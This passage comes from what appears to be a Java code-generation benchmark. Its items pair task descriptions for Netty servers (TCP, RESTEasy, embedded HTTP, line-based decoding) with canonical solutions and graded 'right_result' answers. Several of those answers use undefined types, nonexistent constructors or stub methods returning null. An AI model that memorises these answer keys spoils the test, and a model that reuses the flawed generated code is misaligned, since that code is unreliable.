    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port;\n    private List<Protocol> protocolList = new ArrayList<>();\n\n    public RemoteServer(int port) {\n        this.port = port;\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    @Override\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add your custom handlers here\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        // Implement logic to find protocol by browser's channel context\n        return null;\n    }\n\n    public Protocol findProtocolByKey(String key) {\n        // Implement logic to find protocol by key\n        return null;\n    }\n\n    public Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        // Implement logic to find protocol by client's channel context\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 175,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling multiple client connections with configurable channel handlers.\n\nClass Description: MockTcpServer is a Netty-based TCP server implementation that provides flexible handler configuration and proper resource management. It uses NIO event loop groups for efficient connection handling and includes graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles the traffic of accepted connections\n- channel: [Channel] - Represents the server's listening channel\n- handlers: [List<Supplier<? extends ChannelHandler>>] - List of handler suppliers for processing incoming data\n\nMethods:\n- addHandler(Supplier<? extends ChannelHandler> supplier) -> [void] - Adds a channel handler supplier to the pipeline configuration\n- initialize(int port) -> [void] throws InterruptedException - Starts the server on specified port and initializes all configured handlers\n- shutdown() -> [void] - Closes the server channel and triggers graceful shutdown of event loops\n- Resources (static inner class) -> [NioEventLoopGroup] - Manages shared event loop groups and shutdown hooks for resource cleanup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.DefaultThreadFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Supplier;\n\npublic class MockTcpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        bossGroup = Resources.bossGroup;\n        workerGroup = Resources.workerGroup;\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .option(ChannelOption.SO_BACKLOG, 100)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) {\n                 ChannelPipeline p = ch.pipeline();\n                 for (Supplier<? extends ChannelHandler> handler : handlers) {\n                     p.addLast(handler.get());\n                 }\n             }\n         });\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n    }\n\n    public void shutdown() {\n        channel.close();\n    }\n\n    private static class Resources {\n        private static final EventLoopGroup bossGroup;\n        private static final EventLoopGroup workerGroup;\n\n        static {\n            bossGroup = new NioEventLoopGroup(1, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n            workerGroup = new NioEventLoopGroup(5, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                bossGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n                workerGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n            }, \"MockRedisServer-shutdown\"));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.function.Supplier;\n\npublic class MockTcpServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n    private final List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 for (Supplier<? extends ChannelHandler> handler : handlers) {\n                     p.addLast(handler.get());\n                 }\n             }\n         });\n\n        channel = b.bind(port).sync().channel();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static class Resources {\n        public static final NioEventLoopGroup SHARED_BOSS_GROUP = new NioEventLoopGroup();\n        public static final NioEventLoopGroup SHARED_WORKER_GROUP = new NioEventLoopGroup();\n\n        static {\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                SHARED_BOSS_GROUP.shutdownGracefully();\n                SHARED_WORKER_GROUP.shutdownGracefully();\n            }));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Implement a Netty-based JAX-RS server class that handles HTTP requests and integrates with RESTEasy framework for RESTful service deployment.\n\nClass Description: SofaNettyJaxrsServer is a Netty-based embedded JAX-RS server implementation that provides HTTP communication capabilities and integrates with RESTEasy framework for RESTful service deployment. It supports both standard NIO and Epoll transport, SSL/TLS encryption, and customizable channel options.\n\nAttributes:\n- serverConfig: [ServerConfig] - Configuration object containing server settings\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- hostname: [String] - Hostname to bind the server to\n- port: [int] - Port number to listen on\n- deployment: [ResteasyDeployment] - RESTEasy deployment configuration\n- root: [String] - Root resource path\n- domain: [SecurityDomain] - Security domain for authentication\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- eventExecutor: [EventLoopGroup] - Netty event executor for business logic\n- ioWorkerCount: [int] - Number of I/O worker threads\n- executorThreadCount: [int] - Number of executor threads\n- sslContext: [SSLContext] - SSL context for secure connections\n- maxRequestSize: [int] - Maximum allowed HTTP request size\n- backlog: [int] - Connection backlog size\n- channelHandlers: [List<ChannelHandler>] - Additional channel handlers\n- channelOptions: [Map<ChannelOption, Object>] - Channel options\n- childChannelOptions: [Map<ChannelOption, Object>] - Child channel options\n- httpChannelHandlers: [List<ChannelHandler>] - Additional HTTP channel handlers\n\nMethods:\n- start(): [void] - Starts the Netty server and binds it to the configured host and port\n- stop(): [void] - Stops the server and releases all resources\n- createChannelInitializer(): [ChannelInitializer<SocketChannel>] - Creates a channel initializer for new connections\n- setupHandlers(SocketChannel ch, RequestDispatcher dispatcher): [void] - Sets up the channel pipeline with required handlers\n- createRequestDispatcher(): [RequestDispatcher] - Creates a RESTEasy request dispatcher",
    "Canonical_solution": "import com.alipay.sofa.rpc.common.SystemInfo;\nimport com.alipay.sofa.rpc.common.struct.NamedThreadFactory;\nimport com.alipay.sofa.rpc.common.utils.StringUtils;\nimport com.alipay.sofa.rpc.config.ServerConfig;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.EventExecutor;\nimport org.jboss.resteasy.core.SynchronousDispatcher;\nimport org.jboss.resteasy.plugins.server.embedded.EmbeddedJaxrsServer;\nimport org.jboss.resteasy.plugins.server.embedded.SecurityDomain;\nimport org.jboss.resteasy.plugins.server.netty.RequestDispatcher;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpRequestDecoder;\nimport org.jboss.resteasy.plugins.server.netty.RestEasyHttpResponseEncoder;\nimport org.jboss.resteasy.spi.ResteasyDeployment;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.net.InetSocketAddress;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\n\npublic class SofaNettyJaxrsServer implements EmbeddedJaxrsServer {\n\n    private final ServerConfig         serverConfig;\n    protected ServerBootstrap          bootstrap;\n    protected String                   hostname;\n    protected int                      port;\n    protected ResteasyDeployment       deployment;\n    protected String                   root;\n    protected SecurityDomain           domain;\n    private EventLoopGroup             eventLoopGroup;\n    private EventLoopGroup             eventExecutor;\n    private int                        ioWorkerCount;\n    private int                        executorThreadCount;\n    private SSLContext                 sslContext;\n    private int                        maxRequestSize;\n    private int                        backlog;\n    private List<ChannelHandler>       channelHandlers;\n    private Map<ChannelOption, Object> channelOptions;\n    private Map<ChannelOption, Object> childChannelOptions;\n    private List<ChannelHandler>       httpChannelHandlers;\n\n    public SofaNettyJaxrsServer(ServerConfig serverConfig) {\n        if (serverConfig == null) {\n            throw new IllegalArgumentException(\"server config is null\");\n        }\n        this.serverConfig = serverConfig;\n        this.deployment = new ResteasyDeployment();\n        this.root = \"\";\n        this.ioWorkerCount = SystemInfo.getCpuCores() * 2;\n        this.executorThreadCount = 16;\n        this.maxRequestSize = 1024 * 1024 * 10;\n        this.backlog = 128;\n        this.channelHandlers = Collections.emptyList();\n        this.channelOptions = Collections.emptyMap();\n        this.childChannelOptions = Collections.emptyMap();\n        this.httpChannelHandlers = Collections.emptyList();\n    }\n\n    @Override\n    public void start() {\n        boolean daemon = serverConfig.isDaemon();\n        boolean isEpoll = serverConfig.isEpoll();\n        NamedThreadFactory ioFactory = new NamedThreadFactory(\"SEV-REST-IO-\" + port, daemon);\n        NamedThreadFactory bizFactory = new NamedThreadFactory(\"SEV-REST-BIZ-\" + port, daemon);\n        eventLoopGroup = isEpoll ? new EpollEventLoopGroup(ioWorkerCount, ioFactory)\n            : new NioEventLoopGroup(ioWorkerCount, ioFactory);\n        eventExecutor = isEpoll ? new EpollEventLoopGroup(executorThreadCount, bizFactory)\n            : new NioEventLoopGroup(executorThreadCount, bizFactory);\n\n        bootstrap = new ServerBootstrap()\n            .group(eventLoopGroup)\n            .channel(isEpoll ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n            .childHandler(createChannelInitializer())\n            .option(ChannelOption.SO_BACKLOG, backlog)\n            .childOption(ChannelOption.SO_KEEPALIVE, serverConfig.isKeepAlive());\n\n        for (Map.Entry<ChannelOption, Object> entry : channelOptions.entrySet()) {\n            bootstrap.option(entry.getKey(), entry.getValue());\n        }\n\n        for (Map.Entry<ChannelOption, Object> entry : childChannelOptions.entrySet()) {\n            bootstrap.childOption(entry.getKey(), entry.getValue());\n        }\n\n        final InetSocketAddress socketAddress;\n        if (null == hostname || hostname.isEmpty()) {\n            socketAddress = new InetSocketAddress(port);\n        } else {\n            socketAddress = new InetSocketAddress(hostname, port);\n        }\n\n        bootstrap.bind(socketAddress).syncUninterruptibly();\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        final RequestDispatcher dispatcher = createRequestDispatcher();\n        if (sslContext == null) {\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        } else {\n            final SSLEngine engine = sslContext.createSSLEngine();\n            engine.setUseClientMode(false);\n            return new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addFirst(new SslHandler(engine));\n                    setupHandlers(ch, dispatcher);\n                }\n            };\n        }\n    }\n\n    private void setupHandlers(SocketChannel ch, RequestDispatcher dispatcher) {\n        ChannelPipeline channelPipeline = ch.pipeline();\n        channelPipeline.addLast(channelHandlers.toArray(new ChannelHandler[channelHandlers.size()]));\n        channelPipeline.addLast(new HttpRequestDecoder());\n        channelPipeline.addLast(new HttpObjectAggregator(maxRequestSize));\n        channelPipeline.addLast(new HttpResponseEncoder());\n        channelPipeline.addLast(httpChannelHandlers.toArray(new ChannelHandler[httpChannelHandlers.size()]));\n        channelPipeline.addLast(new RestEasyHttpRequestDecoder(dispatcher.getDispatcher(), root));\n        channelPipeline.addLast(new RestEasyHttpResponseEncoder());\n        channelPipeline.addLast(eventExecutor, new SofaRestRequestHandler(dispatcher));\n    }\n\n    protected RequestDispatcher createRequestDispatcher() {\n        return new RequestDispatcher((SynchronousDispatcher) deployment.getDispatcher(),\n            deployment.getProviderFactory(), domain);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            eventLoopGroup.shutdownGracefully().sync();\n            eventExecutor.shutdownGracefully().sync();\n        } catch (Exception ignore) {\n        }\n        bootstrap = null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.handler.ssl.SslContext;\nimport org.jboss.resteasy.plugins.server.netty.NettyHttpServer;\nimport org.jboss.resteasy.spi.Dispatcher;\n\npublic class SofaNettyJaxrsServer {\n    private ServerConfig serverConfig;\n    private ServerBootstrap bootstrap;\n    private String hostname;\n    private int port;\n    private ResteasyDeployment deployment;\n    private String root;\n    private SecurityDomain domain;\n    private EventLoopGroup eventLoopGroup;\n    private EventLoopGroup eventExecutor;\n    private int ioWorkerCount;\n    private int executorThreadCount;\n    private SslContext sslContext;\n    private int maxRequestSize;\n    private int backlog;\n    private List<ChannelHandler> channelHandlers;\n    private Map<ChannelOption, Object> channelOptions;\n    private Map<ChannelOption, Object> childChannelOptions;\n    private List<ChannelHandler> httpChannelHandlers;\n\n    public void start() {\n        if (serverConfig.isEpoll()) {\n            eventLoopGroup = new EpollEventLoopGroup(ioWorkerCount);\n        } else {\n            eventLoopGroup = new NioEventLoopGroup(ioWorkerCount);\n        }\n        eventExecutor = new NioEventLoopGroup(executorThreadCount);\n\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(eventLoopGroup, eventExecutor)\n                .channel(serverConfig.isEpoll() ? io.netty.channel.epoll.EpollServerSocketChannel.class : io.netty.channel.socket.nio.NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, backlog)\n                .childOption(ChannelOption.MAX_MESSAGES_PER_READ, 100)\n                .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .handler(new LoggingHandler(LogLevel.INFO))\n                .childHandler(createChannelInitializer());\n\n        try {\n            ChannelFuture future = bootstrap.bind(hostname, port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        if (bootstrap != null) {\n            bootstrap.config().group().shutdownGracefully();\n            bootstrap.config().childGroup().shutdownGracefully();\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> createChannelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                if (sslContext != null) {\n                    pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                }\n                for (ChannelHandler handler : channelHandlers) {\n                    pipeline.addLast(handler);\n                }\n                setupHandlers(ch, createRequestDispatcher());\n            }\n        };\n    }\n\n    private void setupHandlers(SocketChannel ch, Dispatcher dispatcher) {\n        ChannelPipeline pipeline = ch.pipeline();\n        for (ChannelHandler handler : httpChannelHandlers) {\n            pipeline.addLast(handler);\n        }\n        pipeline.addLast(new NettyHttpServer(dispatcher));\n    }\n\n    private Dispatcher createRequestDispatcher() {\n        return deployment.getDispatcher();\n    }\n}\n```"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a Java class that implements an embedded HTTP server using Netty framework, capable of handling HTTP requests and routing them to appropriate controller methods based on URI paths.\n\nClass Description: EmbedHttpServer is a Netty-based HTTP server implementation that provides request routing functionality to various controller methods. It supports adding custom controllers with RequestMapping annotations and handles both successful responses and error cases.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- defaultController: DefaultController - The default controller to handle unmatched requests\n- controllerList: List<Object> - List of registered controller objects that handle specific routes\n- LOGGER: Logger - Logger instance for error and debug logging\n\nMethods:\n- EmbedHttpServer(int port) -> EmbedHttpServer - Constructor that initializes the server with specified port\n- invoke(String uri, Channel channel, FullHttpRequest request) -> FullHttpResponse - Routes the incoming request to the appropriate controller method based on URI matching\n- fixUri(String uri) -> String - Normalizes URI paths by ensuring proper slash formatting\n- start(GenericFutureListener startedListener) -> void - Starts the Netty server with specified configuration and event listeners\n- addController(Object obj) -> EmbedHttpServer - Registers a controller object to handle specific routes, supports method chaining",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.lang.reflect.Method;\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport org.pdown.gui.http.controller.DefaultController;\nimport org.pdown.gui.http.util.HttpHandlerUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\npublic class EmbedHttpServer {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n\n  private int port;\n  private DefaultController defaultController;\n  private List<Object> controllerList;\n\n  public EmbedHttpServer(int port) {\n    this.port = port;\n    this.defaultController = new DefaultController();\n    this.controllerList = new ArrayList<>();\n  }\n\n  public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) throws Exception {\n    if (controllerList != null) {\n      for (Object obj : controllerList) {\n        Class<?> clazz = obj.getClass();\n        RequestMapping mapping = clazz.getAnnotation(RequestMapping.class);\n        if (mapping != null) {\n          String mappingUri = fixUri(mapping.value()[0]);\n          for (Method actionMethod : clazz.getMethods()) {\n            RequestMapping subMapping = actionMethod.getAnnotation(RequestMapping.class);\n            if (subMapping != null) {\n              String subMappingUri = fixUri(subMapping.value()[0]);\n              if (uri.equalsIgnoreCase(mappingUri + subMappingUri)) {\n                return (FullHttpResponse) actionMethod.invoke(obj, channel, request);\n              }\n            }\n          }\n        }\n      }\n    }\n    return defaultController.handle(channel, request);\n  }\n\n  private String fixUri(String uri) {\n    StringBuilder builder = new StringBuilder(uri);\n    if (builder.indexOf(\"/\") != 0) {\n      builder.insert(0, \"/\");\n    }\n    if (builder.lastIndexOf(\"/\") == builder.length() - 1) {\n      builder.delete(builder.length() - 1, builder.length());\n    }\n    return builder.toString();\n  }\n\n  public void start(GenericFutureListener startedListener) {\n    NioEventLoopGroup bossGroup = new NioEventLoopGroup(2);\n    NioEventLoopGroup workGroup = new NioEventLoopGroup(2);\n    try {\n      ServerBootstrap bootstrap = new ServerBootstrap().group(bossGroup, workGroup)\n          .channel(NioServerSocketChannel.class)\n          .childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n              ch.pipeline().addLast(\"httpCodec\", new HttpServerCodec());\n              ch.pipeline().addLast(new HttpObjectAggregator(4194304));\n              ch.pipeline()\n                  .addLast(\"serverHandle\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                      URI uri = new URI(request.uri());\n                      FullHttpResponse httpResponse = invoke(uri.getPath(), ctx.channel(), request);\n                      if (httpResponse != null) {\n                        httpResponse.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n                        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n                        ch.writeAndFlush(httpResponse);\n                      }\n                    }\n\n                    @Override\n                    public void channelUnregistered(ChannelHandlerContext ctx) {\n                      ctx.channel().close();\n                    }\n\n                    @Override\n                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                      LOGGER.error(\"native request error\", cause.getCause() == null ? cause : cause.getCause());\n                      Map<String, Object> data = new HashMap<>();\n                      data.put(\"error\", cause.getCause().toString());\n                      FullHttpResponse httpResponse = HttpHandlerUtil.buildJson(data);\n                      httpResponse.setStatus(HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                      ctx.channel().writeAndFlush(httpResponse);\n                    }\n                  });\n            }\n          });\n      ChannelFuture f = bootstrap.bind(\"127.0.0.1\", port).sync();\n      if (startedListener != null) {\n        f.addListener(startedListener);\n      }\n      f.channel().closeFuture().sync();\n    } catch (Exception e) {\n      e.printStackTrace();\n    } finally {\n      bossGroup.shutdownGracefully();\n      workGroup.shutdownGracefully();\n    }\n  }\n\n  public EmbedHttpServer addController(Object obj) {\n    this.controllerList.add(obj);\n    return this;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\n\npublic class EmbedHttpServer {\n    private final int port;\n    private final DefaultController defaultController;\n    private final List<Object> controllerList = new ArrayList<>();\n    private static final Logger LOGGER = Logger.getLogger(EmbedHttpServer.class.getName());\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n        this.defaultController = new DefaultController();\n    }\n\n    public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) {\n        uri = fixUri(uri);\n        for (Object controller : controllerList) {\n            if (controller instanceof Controller) {\n                Controller<?> ctrl = (Controller<?>) controller;\n                if (ctrl.matches(uri)) {\n                    return ctrl.handleRequest(request);\n                }\n            }\n        }\n        return defaultController.handleRequest(request);\n    }\n\n    public String fixUri(String uri) {\n        if (!uri.startsWith(\"/\")) {\n            uri = \"/\" + uri;\n        }\n        if (uri.endsWith(\"/\") && uri.length() > 1) {\n            uri = uri.substring(0, uri.length() - 1);\n        }\n        return uri;\n    }\n\n    public void start(GenericFutureListener<ChannelFuture> startedListener) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n                             FullHttpResponse response = invoke(msg.uri(), ctx.channel(), msg);\n                             ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);\n                         }\n                     });\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.addListener(startedListener);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public EmbedHttpServer addController(Object obj) {\n        controllerList.add(obj);\n        return this;\n    }\n}\n```"
  },
  {
    "Task_id": 178,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework with line-based frame decoding capability. The server should handle incoming connections, process line-delimited messages, and manage resources properly during startup and shutdown.\n\nClass Description: MyLineBasedFrameDecoderServer is a Netty-based TCP server that uses line-based frame decoding for handling text protocols. It manages server lifecycle including startup, connection handling, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for accepted connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number for the server (8023)\n\nMethods:\n- start([int port]) -> [void] - Starts the server on specified port, binds handlers, and begins accepting connections. Throws Exception if startup fails.\n- shutdown() -> [void] - Gracefully shuts down the server by releasing all thread resources\n- main([String[] args]) -> [void] - Entry point that creates and starts the server instance on default port",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyLineBasedFrameDecoderServer {\n\n    public static int DEFAULT_PORT = 8023;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public MyLineBasedFrameDecoderServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new MyLineBasedFrameDecoderChannelInitializer())\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"MyLineBasedFrameDecoderServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = DEFAULT_PORT;\n        MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class MyLineBasedFrameDecoderServer {\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private ServerBootstrap bootstrap = new ServerBootstrap();\n    private static final int DEFAULT_PORT = 8023;\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                      .channel(NioServerSocketChannel.class)\n                      .childHandler(new ChannelInitializer<SocketChannel>() {\n                          @Override\n                          protected void initChannel(SocketChannel ch) throws Exception {\n                              ChannelPipeline pipeline = ch.pipeline();\n                              pipeline.addLast(new StringDecoder());\n                              pipeline.addLast(new StringEncoder());\n                              